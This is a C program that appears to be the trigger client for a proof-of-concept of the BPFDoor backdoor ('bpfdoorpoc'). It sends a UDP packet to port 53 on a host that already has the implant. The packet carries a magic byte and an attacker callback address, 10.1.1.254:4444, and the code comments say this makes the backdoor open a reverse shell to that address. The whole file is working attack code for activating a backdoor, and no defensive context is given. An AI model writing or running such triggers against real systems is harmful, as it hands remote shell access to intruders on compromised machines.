#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

int main ()
{
	struct sockaddr_in sin;
	int sin_len = sizeof (sin);
	int sock;
	int buf_len = 20;
	char buf[buf_len];

	if ((sock = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
    {
        perror("error opening socket");
        exit(1);
    }

	memset ((char *) &sin, 0, sizeof (sin));
	sin.sin_family = AF_INET;
	
	// bpfdoorpoc ip & port
	sin.sin_port = htons (53);
	inet_aton ("10.1.1.1", &sin.sin_addr);
	
	// magicbyte + target ip for bpfdoorpoc to reverse shell
  // port is actually hardcoded in bpfdoorpoc.c
	memcpy (buf, "X10.1.1.254:4444", buf_len);
	
    if ((sendto (sock, buf, buf_len, 0, (struct sockaddr *) &sin, sin_len)) < 0)
    {
        perror("error sending data");
        exit(1);
    }

    printf("Sent data\n");
	return 0;
}
